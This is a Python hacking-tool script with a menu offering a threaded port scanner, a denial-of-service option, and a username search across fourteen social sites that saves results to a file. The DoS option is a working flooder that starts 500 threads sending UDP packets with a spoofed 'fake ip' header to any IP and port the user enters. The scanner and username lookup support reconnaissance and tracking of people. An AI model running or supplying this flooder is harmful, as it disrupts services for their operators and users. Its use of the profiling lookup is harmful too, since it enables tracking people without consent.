from socket import *
import sys, time
from datetime import datetime
from threading import *
import socket
import threading 
import concurrent.futures
from urllib import response
import colorama
from colorama import Fore
import base64
import zlib,os
import os
import sys
import time
import socket
import random
import colorama
from colorama import Fore, Back
import random, socket, threading
from colorama import Fore
import requests
R = Fore.RED
Y = Fore.YELLOW
B = Fore.BLUE
RT = Fore.RESET
G = Fore.GREEN
C = Fore.CYAN

tiktok = "http://www.tiktok.com/@"
gitlab = "http://www.gitlab.com/"
dev = "http://www.dev.to/"
github = "http://www.github.com/"
reddit = "http://www.reddit.com/u/"
instagram = "http://www.instagram.com/"
twitter = "http://www.twitter.com/"
imgur = "http://www.imgur.com/user/"
paste = "http://www.pastebin.com/u/"
pinterest = "http://www.pinterest.com/"
snapchat = "http://www.snapchat.com/add/"
spotify = "http://www.spotify.com/user/"
twitch = "http://www.twitch.tv/"
xbox = "http://www.xboxgamertag.com/search/"




print(rf"""{R}
LLLLLLLLLLL              333333333333333   NNNNNNNN        NNNNNNNN  1111111   NNNNNNNN        NNNNNNNN
L:::::::::L             3:::::::::::::::33 N:::::::N       N::::::N 1::::::1   N:::::::N       N::::::N
L:::::::::L             3::::::33333::::::3N::::::::N      N::::::N1:::::::1   N::::::::N      N::::::N
LL:::::::LL             3333333     3:::::3N:::::::::N     N::::::N111:::::1   N:::::::::N     N::::::N
  L:::::L                           3:::::3N::::::::::N    N::::::N   1::::1   N::::::::::N    N::::::N
  L:::::L                           3:::::3N:::::::::::N   N::::::N   1::::1   N:::::::::::N   N::::::N
  L:::::L                   33333333:::::3 N:::::::N::::N  N::::::N   1::::1   N:::::::N::::N  N::::::N
  L:::::L                   3:::::::::::3  N::::::N N::::N N::::::N   1::::l   N::::::N N::::N N::::::N
  L:::::L                   33333333:::::3 N::::::N  N::::N:::::::N   1::::l   N::::::N  N::::N:::::::N
  L:::::L                           3:::::3N::::::N   N:::::::::::N   1::::l   N::::::N   N:::::::::::N
  L:::::L                           3:::::3N::::::N    N::::::::::N   1::::l   N::::::N    N::::::::::N
  L:::::L         LLLLLL            3:::::3N::::::N     N:::::::::N   1::::l   N::::::N     N:::::::::N
LL:::::::LLLLLLLLL:::::L3333333     3:::::3N::::::N      N::::::::N111::::::111N::::::N      N::::::::N
L::::::::::::::::::::::L3::::::33333::::::3N::::::N       N:::::::N1::::::::::1N::::::N       N:::::::N
L::::::::::::::::::::::L3:::::::::::::::33 N::::::N        N::::::N1::::::::::1N::::::N        N::::::N
LLLLLLLLLLLLLLLLLLLLLLLL 333333333333333   NNNNNNNN         NNNNNNN111111111111NNNNNNNN         NNNNNNN{RT}""")

while True:
    try:
        select = str(input(f"""
{R}Port{G} scan:1{RT}
{R}Dos{G}:2{RT}
{R}Username{G} search:3{RT}
{G}Enter {R}tool {G}number here:{RT}"""))
        
        if "1" in select:
            break
        elif "2" in select:
            break
        elif "3" in select:
            break
        else:
            print("\n[-]Wrong Index Number select. Try again...")
    except KeyboardInterrupt:
        print("\n\n[*] User Requested An Interrupt")
        print("[*] Apllication Shutting Down")
        sys.exit(1)

if select == "1":
    print("PORT SCANNER")
    import socket,sys,threading
    if len(sys.argv) > 1: target = socket.gethostbyname(sys.argv[1])
    else: target = socket.gethostbyname(input('> \x1b[93m Enter Target Ip: '))

    def scanPort(target, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c = s.connect_ex((target, port))
        if c == 0: print (f'\tport {port} {G} open {RT}')
        s.close()

    for i in range(1, 1000):
        scan = threading.Thread(target=scanPort, args=(target, i))
        scan.start()


if select == "2":
    target = input(f"{G}Enter ip: ")
    port = int(input(f"{G}Enter port: "))
    fake_ip = input(f"{G}Enter a fake ip [{Y}example: {B}141.107.198.174]{G}: {RT} ")
    counter = 0

    def attack():

        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((target, port))
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))

            global counter
            print(f'\t{G}[{B}*{G}]\t {G} Send {R} {counter} {G}package {RT}')
            counter += 1
            s.close()


    for i in range(500):
        thread = threading.Thread(target=attack)
        thread.start()
    

if select == "3":

    username = input(f"{G}input the {R}username{G}:{RT}")
    print(f"{G}SEARCHING FOR {R}{username}{G} IN:{RT}")
    instagramresponse = requests.get(instagram + (username))
    redditresponse = requests.get(reddit + (username))
    githubresponse = requests.get(github + (username))
    twitterresponse = requests.get(twitter + (username))
    devresponse = requests.get(dev + (username))
    gitlabresponse = requests.get(gitlab + (username))
    imgurresponse = requests.get(gitlab + (username))
    pasteresponse = requests.get(paste + (username))
    pinterestresponse = requests.get(pinterest + (username) + "/")
    snapchatresponse = requests.get(snapchat + (username))
    spotifyresponse = requests.get(spotify + (username))
    twitchresponse = requests.get((twitch) + (username))
    xboxresponse = requests.get(xbox + (username))
    tiktokresponse = requests.get(tiktok + (username))

    if githubresponse.status_code == 200:
        print(f"{G}{github}{username}{RT}")
        githubstatus = f"{github}{username}"
    else:
        print(f"{R}GITHUB NOT FOUND!{RT}")
        githubstatus = "GITHUB NOT FOUND!" 
    if redditresponse.status_code == 200:
        print(f"{G}{reddit}{username}{RT}")
        redditstatus = f"{reddit}{username}"
    else:
        print(f"{R}REDDIT NOT FOUND!{RT}")
        redditstatus = "REDDIT NOT FOUND!"
    if instagramresponse.status_code == 200:
        print(f"{G}{instagram}{username} {RT}")
        instagramstatus = f"{instagram}{username}"
    else:
        print(f"{R}INSTAGRAM NOT FOUND!{RT}")
        instagramstatus = "INSTAGRAM NOT FOUND!"
    if twitterresponse.status_code == 200:
        print(f"{G}{twitter}{username} {RT}")
        twitterstatus = f"{twitter}{username}"
    else:
        print(f"{R}TWITTER NOT FOUND!{RT}")
        twitterstatus = "TWITTER NOT FOUND!"
    if devresponse.status_code == 200:
        print(f"{G}{dev}{username}{RT}")
        devstatus = f"{dev}{username}"
    else:
        print(f"{R}DEV.TO NOT FOUND!{RT}")
        devstatus = "DEV.TO NOT FOUND!"
    if gitlabresponse.status_code == 200:
        print(f"{G}{gitlab}{username}{RT}")
        gitlabstatus = f"{gitlab}{username}"
    else:
        print(f"{R}GITLAB NOT FOUND!{RT}")
        gitlabstatus = "GITLAB NOT FOUND!"
    if imgurresponse.status_code == 200:
        print(f"{G}{imgur}{username} {RT}")
        imgurstatus = f"{imgur}{username}"
    else:
        print(f"{R}IMGUR NOT FOUND!{RT}")
        imgurstatus = "IMGUR NOT FOUND!"
    if pasteresponse.status_code == 200:
        print(f"{G}{paste}{username}/{RT}")
        pastestatus = f"{paste}{username}"
    else:
        print(f"{R}PASTEBIN NOT FOUND!{RT}")
        pastestatus = "PASTEBIN NOT FOUND!"
    if pinterestresponse.status_code == 200:
        print(f"{G}{pinterest}{username}{RT}")
        pintereststatus = f"{pinterest}{username}"
    else:
        print(f"{R}PINTEREST NOT FOUND!{RT}")
        pintereststatus = "PINTEREST NOT FOUND!"
    if snapchatresponse.status_code == 200:
        print(f"{G}{snapchat}{username}{RT}")
        snapchatstatus = f"{snapchat}{username}"
    else:
        print(f"{R}SNAPCHAT NOT FOUND!{RT}")
        snapchatstatus = f"SNAPCHAT NOT FOUND!"
    if spotifyresponse.status_code == 200:
        print(f"{G}{spotify}{username}{RT}")
        spotifystatus = f"{spotify}{username}"
    else:
        print(f"{R}SPOTIFY NOT FOUND!{RT}")
        spotifystatus = "SPOTIFY NOT FOUND!"
    if xboxresponse.status_code == 200:
        print(f"{G}{xbox}{username}{RT}")
        xboxstatus = f"{xbox}{username}"
    else:
        print(f"{R}XBOX NOT FOUND!{RT}")
        xboxstatus = "XBOX NOT FOUND!"
    if twitchresponse.status_code == 200:
        print(f"{G}{twitch}{username}{RT}")
        twitchstatus = f"{twitch}{username}"
    else:
        print(f"{R}TWITCH NOT FOUND!{RT}")
        twitchstatus = "TWITCH NOT FOUND!"
    if tiktokresponse.status_code == 200:
        print(f"{G}{tiktok}{username}{RT}")
        tiktokstatus = f"{tiktok}{username}"
    else:
        print(f"{R}TIKTOK NOT FOUND!{RT}")
        tiktokstatus = "TIKTOK NOT FOUND!"
    lol = print("(Shift + click to open)")
    DATA = (f" {githubstatus}\n {redditstatus}\n {instagramstatus}\n {twitterstatus}\n {devstatus}\n {gitlabstatus}\n {imgurstatus}\n {pastestatus}\n {pintereststatus}\n {snapchatstatus}\n {xboxstatus}\n {twitchstatus}\n {tiktokstatus}")
    userfile = f"{username}.txt"
    with open(f"{userfile}", "w")as file:
        file.write(DATA)


    
   